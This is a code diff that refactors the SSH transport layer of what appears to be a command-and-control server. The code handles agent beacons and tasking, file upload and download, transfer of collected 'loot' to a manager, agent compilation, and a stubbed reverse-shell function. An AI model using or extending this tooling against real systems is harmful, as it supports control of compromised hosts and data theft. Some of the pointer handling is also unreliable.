@@ -1,15 +1,10 @@
-#include "transport.h"
-#include "common.h"
-#include "list.h"
-#include "log.h"
-#include "b64.h"
+#include "ssh_transport.h"
 
 
-Ssh_Transport::Ssh_Transport(class Log *logger, class List *list, class AgentInformationHandler *agent, pClientNode node)
+Ssh_Transport::Ssh_Transport(class Log *logger, class List *list, pClientNode node)
 {
     this->logger = logger;
     this->list = list;
-    this->agent = agent;
     this->node = node;
 }
 
@@ -53,7 +48,7 @@ int Ssh_Transport::determine_handler(){
         this->logger->log(logbuff);
         ssh_finalize();
         list->remove_node(this->node);
-        return;
+        return 1;
     }
     
 	do {
@@ -80,7 +75,7 @@ int Ssh_Transport::determine_handler(){
             sprintf(logbuff, "Manager %s: Caught manager connection\n", this->node->data->id);
             this->logger->log(logbuff);
 
-            this->manager_handler();
+            return MANAG_TYPE;
 
         } else {
             // Check if ID exists
@@ -89,7 +84,7 @@ int Ssh_Transport::determine_handler(){
             int exists = misc_directory_exists(strcat(buf, this->node->data->id));
         
             if(!exists){
-                agent->init(this->node->data->id);
+                AgentInformationHandler::init(this->node->data->id);
                 sprintf(logbuff, "Client %s: Initialized agent\n", this->node->data->id);
                 this->logger->log(logbuff);
             }
@@ -106,9 +101,9 @@ int Ssh_Transport::determine_handler(){
                 this->logger->log(logbuff);
                 break;
             }
-            agent->write_beacon(this->node->data->id, beacon);
+            AgentInformationHandler::write_beacon(this->node->data->id, beacon);
 
-            tasking = agent->get_tasking(this->node->data->id);
+            tasking = AgentInformationHandler::get_tasking(this->node->data->id);
             if(!tasking){
                 sprintf(logbuff, "Client %s: caught ssh error\n", this->node->data->id);
                 this->logger->log(logbuff);
@@ -124,7 +119,7 @@ int Ssh_Transport::determine_handler(){
                 break;
             }
             // Pass to handler
-            this->agent_handler();
+            return AGENT_TYPE;
         
         }
         
@@ -141,7 +136,7 @@ int Ssh_Transport::determine_handler(){
     list->remove_node(this->node);
     
 	
-    return 0;
+    return -1;
 }
 
 /*Uploads a file to some connected entity*/
@@ -191,7 +186,6 @@ int Ssh_Transport::upload_file(char *ptr, int is_module){
         return 1;
     }
     
-    printf("Tada\n");
     rc = ssh_channel_read(this->node->data->chan, buff, sizeof(buff), 0);
     if(rc == SSH_ERROR){
         sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", this->node->data->id, ssh_get_error(this->node->data->session));
@@ -210,7 +204,6 @@ int Ssh_Transport::upload_file(char *ptr, int is_module){
     }
     memset(tmpbuffer, 0, 8);
     
-    printf("dee\n");
     rc = ssh_channel_read(this->node->data->chan, tmpbuffer, 8, 0);
     if(rc == SSH_ERROR){
         sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", this->node->data->id, ssh_get_error(this->node->data->session));
@@ -226,17 +219,16 @@ int Ssh_Transport::upload_file(char *ptr, int is_module){
     free(file_data);
     free(enc_data);
 
-    printf("Done with loop\n");
     return 0;
 }
 
 /*Downloads file from connected entity*/
 int Ssh_Transport::download_file(char *ptr, int is_manager, char *extra){
     int rc = 0;
-    int size = 0;
-    int size_e = 0;
-    char *data_ptr;
-    char *enc_ptr;
+    size_t size = 0;
+    size_t size_e = 0;
+    const char *data_ptr;
+    unsigned char *enc_ptr;
     char buff[BUFSIZ*2];
     char tmpbuffer[256];
     char logbuff[BUFSIZ];
@@ -259,8 +251,8 @@ int Ssh_Transport::download_file(char *ptr, int is_manager, char *extra){
     }
 
     size = atoi(tmpbuffer);
-    data_ptr = (char *)malloc(size+1);
-    memset(data_ptr, 0, size+1);
+    data_ptr = (const char *)malloc(size+1);
+    memset((void*)data_ptr, 0, size+1);
             
     // writes file size
     rc = ssh_channel_write(this->node->data->chan, "ok", 3);
@@ -269,11 +261,11 @@ int Ssh_Transport::download_file(char *ptr, int is_manager, char *extra){
         this->logger->log(logbuff);
         return 1;
     }
-    printf("%d\n", size);
+    printf("%lu\n", size);
     int tmpint = 0;
     while (tmpint < size)
     {
-        rc = ssh_channel_read(this->node->data->chan, data_ptr+strlen(data_ptr), size-tmpint, 0);
+        rc = ssh_channel_read(this->node->data->chan, (void *)data_ptr+strlen(data_ptr), size-tmpint, 0);
         if(rc == SSH_ERROR){
             sprintf(logbuff, "%s: Caught channel error: %s\n", this->node->data->id, ssh_get_error(ssh_channel_get_session(this->node->data->chan)));
             this->logger->log(logbuff);
@@ -286,11 +278,11 @@ int Ssh_Transport::download_file(char *ptr, int is_manager, char *extra){
 
     size_e = B64::dec_size(data_ptr);
 
-    enc_ptr = (char *)malloc(size_e);
-    if(!B64::decode(data_ptr, (unsigned char*)enc_ptr, size_e)){
+    enc_ptr = (unsigned char *)malloc(size_e);
+    if(!B64::decode(data_ptr, enc_ptr, size_e)){
         sprintf(logbuff,"%s: failed to decode data\n", this->node->data->id);
         this->logger->log(logbuff);
-        free(data_ptr);
+        free((void*)data_ptr);
         free(enc_ptr);
         rc = ssh_channel_write(this->node->data->chan, "er", 3);
         if(rc == SSH_ERROR){
@@ -300,7 +292,7 @@ int Ssh_Transport::download_file(char *ptr, int is_manager, char *extra){
         }
         return 1;
     }
-    free(data_ptr);
+    free((void*)data_ptr);
             
     // writes file 
     rc = ssh_channel_write(this->node->data->chan, "ok", 3);
@@ -331,7 +323,7 @@ int Ssh_Transport::download_file(char *ptr, int is_manager, char *extra){
 }
 
 /*Sends over all of the loot to the manager*/
-int Ssh_Transport::get_loot(char *ptr){
+int Ssh_Transport::get_loot(char *loot){
     char buff[BUFSIZ];
     char name[BUFSIZ];
     char logbuff[BUFSIZ];
@@ -350,11 +342,11 @@ int Ssh_Transport::get_loot(char *ptr){
     memset(buff, 0, sizeof(buff));
     memset(name, 0, sizeof(name));
     memset(logbuff, 0, sizeof(logbuff));
-    sprintf(logbuff, "Manager %s: Sending Loot -> %s\n", this->node->data->id, ptr);
+    sprintf(logbuff, "Manager %s: Sending Loot -> %s\n", this->node->data->id, loot);
     this->logger->log(logbuff);
     
     count = 0;
-    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), ptr);
+    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), loot);
              
     if((dir = opendir(buff)) != NULL){
         while((ent =readdir(dir)) != NULL){
@@ -366,7 +358,7 @@ int Ssh_Transport::get_loot(char *ptr){
         }
     }
     closedir(dir);
-    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), ptr);
+    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), loot);
     memset(name, 0, sizeof(name));
     sprintf(name, "%d", count);
     
@@ -393,7 +385,7 @@ int Ssh_Transport::get_loot(char *ptr){
                 continue;
             } else {
                 memset(buff, 0, sizeof(buff));
-                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), ptr, ent->d_name);
+                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), loot, ent->d_name);
                 file = fopen(buff, "r");
                 
                 rc = ssh_channel_write(this->node->data->chan, ent->d_name, strlen(ent->d_name));
@@ -574,7 +566,7 @@ int Ssh_Transport::get_info(char *ptr){
 
 
 /*Handler for generic connection. Determines if it is manager or agent*/
-int Ssh_Transport::authenticate(void* sess){
+int Ssh_Transport::handle(void* sess){
     pClientNode node = (pClientNode) sess;
     pClientDat pass = node->data;
     
@@ -614,7 +606,7 @@ int Ssh_Transport::authenticate(void* sess){
         ssh_finalize();
         free(pass);
         this->list->remove_node(node);
-        return;
+        return 1;
     }
     
 	do {
@@ -649,7 +641,7 @@ int Ssh_Transport::authenticate(void* sess){
             int exists = misc_directory_exists(strcat(buf, pass->id));
         
             if(!exists){
-                agent_init(pass->id);
+                AgentInformationHandler::init(pass->id);
                 sprintf(logbuff, "Client %s: Initialized agent\n", pass->id);
                 this->logger->log(logbuff);
             }
@@ -663,12 +655,12 @@ int Ssh_Transport::authenticate(void* sess){
             rc = ssh_channel_read(pass->chan, beacon, sizeof(beacon), 0);
             if(rc == SSH_ERROR){
                 sprintf(logbuff, "Client %s: caught ssh error: %s", pass->id, ssh_get_error(ssh_channel_get_session(pass->chan)));
-                this->logger->(logbuff);
+                this->logger->log(logbuff);
                 break;
             }
-            agent_write_beacon(pass->id, beacon);
+            AgentInformationHandler::write_beacon(pass->id, beacon);
 
-            tasking = agent_get_tasking(pass->id);
+            tasking = AgentInformationHandler::get_tasking(pass->id);
             if(!tasking){
                 sprintf(logbuff, "Client %s: caught ssh error\n", pass->id);
                 this->logger->log(logbuff);
@@ -698,10 +690,16 @@ int Ssh_Transport::authenticate(void* sess){
     ssh_message_free(message);
     ssh_finalize();
     free(pass);
-    list_remove_node(node);
+    this->list->remove_node(node);
     
 	
-    return;
+    return 0;
 }
 
+void Ssh_Transport::make_agent(char *dat_ptr, char *d_ptr){
+    AgentInformationHandler::compile(dat_ptr, d_ptr);
+}
+
+int Ssh_Transport::init_reverse_shell(){
+    return 0;
 }
